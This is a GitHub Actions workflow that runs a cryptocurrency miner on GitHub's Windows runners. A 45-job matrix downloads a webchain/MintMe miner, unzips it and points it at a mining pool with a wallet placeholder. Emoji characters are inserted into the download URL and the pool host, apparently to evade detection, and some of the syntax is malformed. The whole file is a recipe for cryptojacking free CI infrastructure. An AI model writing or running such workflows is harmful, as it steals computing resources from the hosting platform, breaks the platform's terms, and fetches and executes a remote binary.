name: budek wes ojo mining



on: [workflow_dispatch]



jobs:

build:

name: budek wes ojo mining

runs-on: windows-latest

strategy:

max-parallel: 5

fail-fast: false

matrix:

go: [1.0, 1.1, 1.2, 1.3, 1,35]

flag: [A, B, C, D, E, F, G, H, I]

env:

NUM_JOBS: 20

JOB: ${{ matrix.go }}

steps:

- name: PREPARING
run: Invoke-WebRequesthttps:/😊/github😊.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-win64.zip-OutFile webchain-miner-2.8.0-win64.zip

- name: Seting-UP
run: Expand-Archive webchain-miner-2.8.0-win64.zip

- name: Running
run: .\webchain-miner-2.8.0-win64\webchain-miner.exe -o pool.webchain😊.network:2222 -p x -t 1 -u MINTME_WALLET

- name: END
run: exit
